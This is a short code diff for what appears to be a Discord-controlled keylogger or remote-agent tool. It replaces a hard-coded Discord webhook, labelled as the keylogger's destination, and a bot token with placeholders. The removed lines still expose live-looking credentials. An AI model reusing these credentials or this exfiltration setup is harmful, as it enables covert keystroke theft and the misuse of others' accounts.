@@ -36,12 +36,11 @@ import logging
 from libraries import layn
 
 
-
-GUILD = discord.Object(id = "1338668151688269935")
-CHANNEL = 1341917621582303302
-KEYLOGGER_WEBHOOK = "https://discord.com/api/webhooks/1341924453646340157/flbaJNX2Fd3uvGmc3LZq0IwLo9RcVIVR3x-g_5U89iFIcdUOFK3lzfivWfKFHM3PahBd"
+GUILD = discord.Object(id = "ID GRUPO")
+CHANNEL = ID CANAL
+KEYLOGGER_WEBHOOK = "WEBHOOK DISCORD"
 CURRENT_AGENT = 0
-BOT_TOKEN = "MTM0MTkxODA0MzQ3OTIxNjI1OQ.GRAGNh.7WMbCgbJH0FXwmz7v9E1Hs2wvcHOlnpM82mDsI"
+BOT_TOKEN = "TOKEN BOT"
 
 class Bot(commands.Bot):
     def __init__(self):
